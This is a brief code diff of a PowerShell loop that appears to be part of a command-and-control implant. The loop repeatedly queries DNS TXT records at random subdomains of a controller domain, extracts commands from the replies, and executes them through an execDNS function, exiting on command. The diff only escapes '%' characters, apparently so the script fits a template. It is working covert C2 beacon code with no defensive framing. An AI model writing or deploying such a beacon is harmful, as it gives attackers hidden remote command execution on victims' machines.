@@ -60,8 +60,8 @@ while (1){
    $c = Get-Random;
    Start-Sleep -s 3
    $u=$c.ToString()+"."+$url;$txt = resolve-dnsname -type 16 -dnsonly $u | select-object Strings | Out-String
-   $txt = $txt.split("`n") | %{$_.split('{')[1]} | Out-String
-   $txt = $txt.split("`n") | %{$_.split('}')[0]} | Out-String
+   $txt = $txt.split("`n") | %%{$_.split('{')[1]} | Out-String
+   $txt = $txt.split("`n") | %%{$_.split('}')[0]} | Out-String
    if ($txt -match 'NoCMD'){continue}
    elseif ($txt -match 'exit'){Exit}
    else{execDNS($txt)}
